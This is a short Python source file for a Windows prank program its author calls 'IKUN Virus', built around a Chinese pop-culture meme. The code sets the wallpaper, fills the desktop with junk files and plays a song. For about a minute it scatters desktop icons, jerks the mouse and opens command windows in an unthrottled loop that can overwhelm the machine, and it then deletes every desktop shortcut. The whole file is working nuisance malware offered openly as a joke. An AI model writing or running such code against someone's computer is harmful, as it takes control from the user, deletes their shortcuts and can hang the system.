import ctypes
from pynput import mouse
from random import randint
from threading import Thread
from time import time, sleep
from pygame import mixer, init
from commctrl import LVM_GETITEMCOUNT, LVM_SETITEMPOSITION
from win32gui import FindWindowEx, SendMessage, PostMessage
from os import getlogin, path, listdir, remove, system, getcwd


seconds = 55
pth = 'C:\\Users\\%s\\Desktop' % getlogin()


def start_cmd(sec, txt):
    start_time = time()
    while time() - start_time <= sec:
        system('start "%s" cmd' % txt)


def move_mouse(sec):
    start_time = time()
    ms = mouse.Controller()
    while time() - start_time <= sec:
        tmp = randint(1, 4)
        nx = 0 if tmp % 2 == 0 else (-5 if tmp == 1 else 5)
        ny = 0 if tmp % 2 else (-5 if tmp == 2 else 5)
        ms.move(nx, ny)


def del_desktop_lnk():
    for file in listdir(pth):
        if file[-4:] == '.lnk':
            try:
                remove(path.join(pth, file))
            except PermissionError:
                pass


def new_ikun_files(count):
    cnt = {
        '你干嘛': 0,
        '鸡你太美': 0,
        'IKUN': 0,
        '哈哈哟': 0,
        '迎面走来的你让我如此蠢蠢欲动': 0,
        '这种感觉我从未有': 0,
        'Cause I got a crash on you': 0,
        'who you': 0,
        'yeah': 0,
    }
    ind = 0
    txt = """
    《IKV.exe》,
    Author: KKKLLLHHH, 
    Hello, my friend. This is my new program, IKV(IKUN Virus).
    It it a computer virus. But it will not destroy your computer. 
    Just as you see, it only deleted the shortcuts on your desktop, and did not deleted other files. 
    So, it is just a joke. 
    It is a real IKUN's joke.
    """
    for i in range(count):
        key_list = list(cnt.keys())
        nm = key_list[ind] + (str(cnt[key_list[ind]]) if cnt[key_list[ind]] else '') + '.ikun'
        cnt[key_list[ind]] += 1
        ind = (ind + 1) % len(cnt)
        with open(path.join(pth, nm), 'w', encoding='utf-8') as f:
            f.write(txt)


def set_background(filename):
    ctypes.windll.user32.SystemParametersInfoW(20, 0, path.join(getcwd(), filename), 0)


def move_files(sec):
    hwnd = FindWindowEx(0, 0, 'Progman', 'Program Manager')
    hwndShelldll = FindWindowEx(hwnd, 0, 'SHELLDLL_DefView', '')
    hwndDesktop = FindWindowEx(hwndShelldll, 0, 'SysListView32', 'FolderView')
    IconCount = SendMessage(hwndDesktop, LVM_GETITEMCOUNT, 0, 0)

    ind = 0
    start_time = time()
    while time() - start_time <= sec:
        PostMessage(hwndDesktop, LVM_SETITEMPOSITION, ind, randint(0, 1920) + (randint(0, 1080) << 16))
        ind = (ind + 1) % IconCount
        sleep(0.05)


def play_music(file):
    mixer.music.load(file)
    mixer.music.play()


def start_thread(func, *a):
    tmp = Thread(target=func, args=a)
    tmp.start()


init()
mixer.init()

set_background('cxk.png')    # 将坤坤设置为背景
new_ikun_files(50)    # 新建50个.ikun文件
sleep(3)    # 等文件建好
start_thread(play_music, '鸡你太美.mp3')    # 播放鸡你太美
start_thread(move_files, seconds)    # 《文件图标欢快跃动》
start_thread(move_mouse, seconds)    # 《鼠标飞舞》
start_thread(start_cmd, seconds, '鸡你太美')    # 不停地建cmd窗口
sleep(seconds)
del_desktop_lnk()    # 把桌面快捷方式全删了（不敢删其他文件
